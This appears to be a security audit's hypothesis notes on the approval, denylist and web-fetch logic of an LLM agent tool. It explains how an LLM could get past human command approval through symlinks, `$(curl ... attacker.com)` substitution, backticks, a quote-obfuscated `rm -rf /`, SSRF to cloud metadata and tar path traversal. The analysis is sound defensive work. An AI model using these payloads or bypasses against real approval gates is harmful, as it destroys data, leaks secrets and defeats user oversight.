# Round 2 Hypotheses — Contradiction Reasoner (TRIZ / Invariant Violation)

## PH-07: Approval Prefix Promotes to Wildcard — Hierarchical Match Scope Creep

**Reasoning model**: Contradiction (TRIZ contradiction: "scoped approval" invariant vs. "hierarchical inheritance" implementation)
**Status**: VALIDATED

The design intent: user approves `cat tools/file.go`, only that specific command is allowed in future.

The implementation (`ApprovalManager.AddToAllowlist`, approval.go:461-478):
- `extractBashPrefix("cat tools/file.go")` → `"cat:tools/"`
- This prefix is stored in `a.prefixes`
- `matchesHierarchicalPrefix` at line 449-452: `strings.HasPrefix(currentPath, storedPath)` — so `cat:tools/` matches `cat:tools/src/`, `cat:tools/any/deeply/nested/`, `cat:tools/../../../../etc/` (wait — cleaned path would not have `../`, but the COMMAND fed to bash does not go through cleaning again)

The invariant broken: the key derives from a LEXICALLY CLEANED path, but bash executes the RAW command string. After approving `cat tools/file.go` (key `cat:tools/`), the command:
```
cat tools/../../../etc/passwd
```
produces approval key `cat:tools/` (extractBashPrefix: `path.Clean("tools/../../../etc/passwd")` starts with `..` → returns "" → falls through to second loop → `cat:./`). Actually this specific case is caught.

BUT: symlink-based bypass. After approving `cat tools/file.go`:
```
cat tools/symlink-to-etc-passwd
```
where `tools/symlink-to-etc-passwd` is a symlink created by an earlier LLM-invoked bash command pointing to `/etc/passwd`. `extractBashPrefix` sees `tools/symlink-to-etc-passwd` → prefix `cat:tools/` → matches → approved. Bash follows the symlink.

Combined attack: (1) LLM asks approval for `mkdir -p tools/tmp` + `ln -s /etc/passwd tools/tmp/x`. First two may require separate approvals. (2) `cat tools/tmp/x` — approved automatically by `cat:tools/` prefix.

**Code path**: `approval.go:461` (AddToAllowlist stores prefix) → `approval.go:427` (matchesHierarchicalPrefix) → `bash.go:64` (bash follows symlink)
**Sanitizers**: `extractBashPrefix` uses `path.Clean` (lexical only, no `EvalSymlinks`); no symlink resolution at approval time or execution time
**Consequence**: LLM reads files outside the project directory by first creating a symlink then using an approved command
**Severity**: HIGH

---

## PH-08: Command Substitution and Parameter Expansion Bypass — Approval Key vs. Execution Reality

**Reasoning model**: Contradiction (TRIZ: approved string != executed string)
**Status**: VALIDATED

`extractBashPrefix` is a pure lexical tokenizer. Bash command substitution `$(...)` and backticks execute subcommands. These are invisible to the approval logic:

```
cat tools/$(curl -s http://attacker.com/cmd)
```
- `extractBashPrefix`: sees arg `tools/$(curl -s http://attacker.com/cmd)`
- Contains `/`, not `..`, not absolute → proceeds to `path.Clean`
- `path.Clean("tools/$(curl -s http://attacker.com/cmd)")` → `tools/$(curl -s http://attacker.com/cmd)` (no `..` to clean)
- Prefix returned: `cat:tools/` → matches stored prefix → APPROVED
- Bash evaluates `$(curl -s http://attacker.com/cmd)` → executes remote command, uses result as filename

OR more directly:
```
cat tools/`id > /tmp/out`
```
- backtick subshell runs `id > /tmp/out` during filename expansion
- prefix key is `cat:tools/`...`/` → matches → approved

**Code path**: approval.go:231 (extractBashPrefix, no metachar filter) → approval.go:389 (IsAllowed passes) → bash.go:64
**Sanitizers**: None. `extractBashPrefix` does not scan for `$(`, backticks, `{`, `[`, `*`
**Consequence**: LLM triggers arbitrary code execution by embedding command substitution in a path argument that appears to be under an approved directory
**Severity**: CRITICAL (zero additional user interaction once one prefix is approved)

---

## PH-09: web_fetch SSRF via file:// or internal IP — LLM Reads Local Files via Cloud Proxy

**Reasoning model**: Contradiction (invariant: "web_fetch fetches public web pages"; violation: no scheme restriction)
**Status**: NEEDS-DEEPER

`x/tools/webfetch.go:85`:
```go
if _, err := url.Parse(urlStr); err != nil {
    return "", fmt.Errorf("invalid URL: %w", err)
}
```

`url.Parse("file:///etc/passwd")` → no error. The URL is then sent as JSON to `https://ollama.com/api/web_fetch`. Whether this is a real SSRF depends on what ollama.com does with the URL. The local Ollama process does not make the request itself — it forwards the URL to the cloud API.

If `ollama.com/api/web_fetch` fetches the URL server-side and returns the result, then:
- `file:///etc/passwd` → ollama.com would try to open its OWN `/etc/passwd` (server-side, not local); result is server's passwd file, not client's. Low impact.
- `http://169.254.169.254/latest/meta-data/` → SSRF against ollama.com's cloud metadata service (AWS/GCP IMDS). HIGH impact against ollama.com's infrastructure, not the local user.
- `http://192.168.1.1/admin` → SSRF against ollama.com's internal network if running in cloud.
- `ftp://internal-server/secret` → protocol confusion.

Alternatively, if ollama.com merely reflects the URL as a redirect for the local client to follow: then the local process fetches `file:///etc/passwd`. But looking at the code, the local process POSTs to `webFetchAPI` and reads the JSON response — it does NOT follow redirects to the target URL itself.

**Code path**: `webfetch.go:79-130` → POST to `ollama.com/api/web_fetch` with attacker-supplied URL
**Sanitizers**: `url.Parse` (syntactic only); no scheme allowlist, no host allowlist
**Consequence**: Server-side SSRF against ollama.com's infrastructure if ollama.com fetches the URL; or exfiltration of ollama.com-side internal resources; unclear without knowing server-side behavior
**Ambiguity**: Whether ollama.com's API fetches the URL server-side is not knowable from local source alone. Needs confirmation.
**Severity**: MEDIUM-HIGH (if ollama.com fetches server-side) / LOW (if it validates on its end)

---

## PH-10: Pipe-Split Bypass — Commands After First Pipe Segment Are Not Denylist-Checked

**Reasoning model**: Contradiction (invariant: "denylist stops dangerous commands"; violation: only first pipe segment checked for prefix, full string checked for denied patterns)

Actually reviewing the code: `IsDenied` at approval.go:176 checks the FULL command string including all pipe segments. BUT `extractBashPrefix` splits on `|` and only processes the first segment. So:

```
cat tools/file.go | rm -rf /
```
- `IsDenied("cat tools/file.go | rm -rf /")` → finds `rm -rf` → BLOCKED ✓

BUT:
```
cat tools/file.go | r''m -rf /
```
- `IsDenied`: looks for `rm -rf`, sees `r''m -rf /` → NO MATCH (because of quoting — wait, this is the full string before shell evaluation, and the denylist operates on the string-before-execution)
- `IsDenied` finds no pattern match because `r''m` != `rm -rf` → PASSES IsDenied
- `extractBashPrefix("cat tools/file.go | r''m -rf /")` → splits on `|`, first part `cat tools/file.go`, prefix `cat:tools/` → matches allowlist → APPROVED
- bash executes: `cat tools/file.go | r''m -rf /` → bash evaluates quotes, runs `rm -rf /`

**Status**: VALIDATED (this is the combination of PH-01 and PH-02 via the pipe-split path)
**Severity**: CRITICAL

---

## PH-11: tgzName Newline Injection — Arbitrary tar Extraction Path

**Reasoning model**: Contradiction (invariant: "tgzPath is inside pluginDir"; violation: tgzName from subprocess stdout)
**Status**: VALIDATED

`openclaw.go:779`: `tgzName := strings.TrimSpace(string(out))`. `TrimSpace` removes leading/trailing whitespace including newlines, but NOT embedded newlines.

If `npm pack` stdout contains an embedded newline: `"package-0.2.1.tgz\n../../evil"`, then:
- `strings.TrimSpace` removes outer whitespace
- `tgzName = "package-0.2.1.tgz\n../../evil"`
- `tgzPath = filepath.Join(pluginDir, "package-0.2.1.tgz\n../../evil")`
- On most OSes, `filepath.Join` with a newline in the component is unusual. On Linux, `\n` is a valid character in a path component, so `Join` produces `pluginDir + "/package-0.2.1.tgz\n../../evil"`. The OS opens this as a file whose name literally contains a newline, which likely does not exist, causing `tar` to error.

More realistic: npm stdout is attacker-controlled via a compromised registry package. The more direct attack is the tarball content itself (absolute paths or `../` entries) — covered in PH-05.

For tgzName specifically: the real risk is if a malicious npm package outputs a name containing shell metacharacters (since tar is invoked via exec.Command, NOT a shell, the args are not shell-expanded — `exec.Command("tar", "xzf", tgzPath, ...)` is direct exec, not shell). So the tgzName injection only matters for the file path, not command injection via tar args.

**Status**: NEEDS-DEEPER — tgzName injection into tgzPath is unlikely to work via newlines (would just fail to find file); the real risk is tarball content (PH-05 covers this). However, if the tgzName is attacker-controlled to point to a pre-existing local file (e.g., tgzName = `../../../existing-evil.tgz`), then `tgzPath = filepath.Join(pluginDir, "../../../existing-evil.tgz")` — but `TrimSpace` would keep the `../`. `filepath.Join` DOES clean the path, so `Join("/home/user/.openclaw/extensions/openclaw-web-search", "../../../existing-evil.tgz")` → `"/home/user/.openclaw/existing-evil.tgz"`. This redirects tar to extract a different local file.
**Severity**: MEDIUM (if combined with a pre-positioned file)

---

## PH-12: autoAllowCommands — echo/pwd/date Bypass via Argument Injection

**Reasoning model**: Contradiction
**Status**: VALIDATED (but currently dead code)

`IsAutoAllowed` (approval.go:154-171) checks `fields[0]` against `autoAllowCommands`:
```go
if len(fields) > 0 && autoAllowCommands[fields[0]] {
    return true
}
```
`autoAllowCommands` includes `echo`, `pwd`, `date`, `whoami`, `hostname`, `uname`.

If `IsAutoAllowed` is re-enabled (it's commented out in run.go:391-394 but the comment says "TODO: re-enable"), then:
```
echo $(cat /etc/passwd)
echo `id`
echo $SOME_SECRET_ENV_VAR
```
All pass `IsAutoAllowed` because `fields[0] == "echo"`. All execute arbitrary code via bash.

This is a dormant bypass awaiting re-activation.

**Status**: NEEDS-DEEPER (currently dead, but the TODO comment indicates planned re-enablement)
**Severity**: CRITICAL if re-enabled
